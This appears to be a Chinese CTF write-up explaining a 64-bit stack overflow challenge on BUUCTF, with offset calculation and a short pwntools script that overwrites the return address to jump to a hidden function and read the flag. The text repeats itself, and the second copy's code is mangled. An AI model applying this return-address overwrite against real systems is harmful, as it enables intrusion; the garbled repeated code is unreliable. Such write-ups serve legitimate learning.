看了这个文章我起码能理解我们栈溢出的目的

在做题之前 我们需要先理解

栈的存储方法

![](https://img-blog.csdnimg.cn/417a0e4b615045a89676adbcf36e7ee2.png)![](https://img-blog.csdnimg.cn/1fd23ffb72384b7db0962eeb2ce4550f.png)

 从上往下看 就能理解入栈

说回这道题目

为什么这道题目是栈溢出

## 1.查看基本信息

checksec

![](https://img-blog.csdnimg.cn/81fc50cf922e41d29bb40af670d6e4ee.png)

 file

![](https://img-blog.csdnimg.cn/0c00a88a72ea476ca9b9e35936a6be64.png)

```kotlin
是kali下的elf文件 相当于windows 的exe可执行文件 有main（）和fun()
```

我们把他放入[ida](https://so.csdn.net/so/search?q=ida&spm=1001.2101.3001.7020)

## 2.ida

主函数的代码

![](https://img-blog.csdnimg.cn/6cd972b3917c48439af8c0265056b3de.png)

 但是我们发现还有一个fun()函数

![](https://img-blog.csdnimg.cn/0df0ed6905c74d1d881911321f4a723c.png)

 找到我们的进门钥匙

我们发现我们是输入 东西 并且作为 s

s 的类型是 char    占15个字节

我们看看我们需要多少才能达到被调用函数的返回地址

就是我们需要多少字节才能 让被调用函数返回

![](https://img-blog.csdnimg.cn/f6471a8bf4be4e20882300801294e9fb.png)

在ida中很明显告诉我们栈底和栈顶是多少了

```cobol
因为是64  rdp是栈底 就是高地址   函数结束地址  rsp是栈顶 就是低地址   函数开始地址 压入栈地址
```

FH = 15字节

![](https://img-blog.csdnimg.cn/b8b4eb0b4acc4f35972fad04be8361a7.png)

从图里能看见 局部变量的压入 就是我们输入的s 占 15字节

但是前面还有一个被调用函数的基地址 就是rbp 我们也要给他构造

但是这个多大呢

```cobol
因为这道题目是 64 所以 rbp是 8个字节如果是 32 就是ebp 占 4个字节
```

```kotlin
所以我们只需要构造15字节的东西填充s 构造8个字节的东西填充基地址 并且把函数返回地址改为fun函数地址即可
```

我们也要明白 [fun函数](https://so.csdn.net/so/search?q=fun%E5%87%BD%E6%95%B0&spm=1001.2101.3001.7020)开始的地址是什么

![](https://img-blog.csdnimg.cn/b120d3a19cde4412b78f0cc30ce3c6bf.png)

 得到函数开始地址

```cobol
0x401186
```

这样就能返回到fun函数开始地址

执行fun函数

所以我们开始写exp

```cobol
from pwn import *p=remote('node4.buuoj.cn',27408)payload=b'A'*15+b'B'*8+p64(0x401186+1) p.sendline(payload)p.interactive()
```

输入二进制15个A和8个B 打包小端序的地址 

其中+1是为了栈平衡 （不明白）

如果脚本结尾忘了加p.interactive(),并且交互完程序并未停止的话，程序会直接被杀掉……然后你就会看到调试时总是莫名其妙的sigkill……

```scss
p64()发送数据时，是发送的字节流，也就是比特流（二进制流）
```

 ![](https://img-blog.csdnimg.cn/15073996129c4ef4b061b7f9578a6217.png)

成功

![](https://img-blog.csdnimg.cn/2d76f8c4948849178fd6fbdd371f5861.png)

 cat flag

![](https://img-blog.csdnimg.cn/33b9569233aa49fb822bb864e651959e.png)看了这个文章我起码能理解我们栈溢出的目的

在做题之前我们需要先理解

栈的存储方法



 从上往下看就能理解入栈

说回这道题目

为什么这道题目是栈溢出

1. 查看基本信息
Checksec



 File



是 kali 下的 elf 文件相当于 windows 的 exe
可执行文件
 
有 main（）和 fun()
我们把他放入 ida

2. Ida
主函数的代码



 但是我们发现还有一个 fun ()函数



 找到我们的进门钥匙

我们发现我们是输入东西并且作为 s

S 的类型是 char    占 15 个字节

我们看看我们需要多少才能达到被调用函数的返回地址

就是我们需要多少字节才能让被调用函数返回



在 ida 中很明显告诉我们栈底和栈顶是多少了

因为是 64 
 
Rdp 是栈底就是高地址函数结束地址
 
 
Rsp 是栈顶就是低地址函数开始地址压入栈地址
FH = 15 字节



从图里能看见局部变量的压入就是我们输入的 s 占 15 字节

但是前面还有一个被调用函数的基地址就是 rbp 我们也要给他构造

但是这个多大呢

因为这道题目是 64 所以 rbp 是 8 个字节
如果是 32 就是 ebp 占 4 个字节
所以我们只需要构造 15 字节的东西填充 s 构造 8 个字节的东西填充基地址并且把函数返回地址改为 fun 函数地址即可
我们也要明白 fun 函数开始的地址是什么



 得到函数开始地址

0 x 401186
这样就能返回到 fun 函数开始地址

执行 fun 函数

所以我们开始写 exp

From pwn import *
P=remote ('node 4. Buuoj. Cn', 27408)
Payload=b'A'*15+b'B'*8+p 64 (0 x 401186+1) 
p.sendline (payload)
p.interactive ()
输入二进制 15 个 A 和 8 个 B 打包小端序的地址 

其中+1 是为了栈平衡 （不明白）

如果脚本结尾忘了加p.interactive (), 并且交互完程序并未停止的话，程序会直接被杀掉……然后你就会看到调试时总是莫名其妙的 sigkill……

P 64 ()发送数据时，是发送的字节流，也就是比特流（二进制流）
 

成功



 Cat flag

